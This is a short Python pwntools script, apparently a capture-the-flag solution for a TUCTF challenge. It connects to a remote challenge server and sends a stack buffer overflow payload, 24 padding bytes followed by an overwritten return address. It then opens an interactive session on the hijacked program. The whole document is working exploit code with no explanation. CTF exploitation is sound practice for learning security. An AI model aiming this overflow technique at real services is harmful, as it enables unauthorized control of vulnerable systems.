from pwn import *

p = remote('chal.tuctf.com',30508)
p.sendline('A'*24+p32(0x80491F6))

p.interactive()
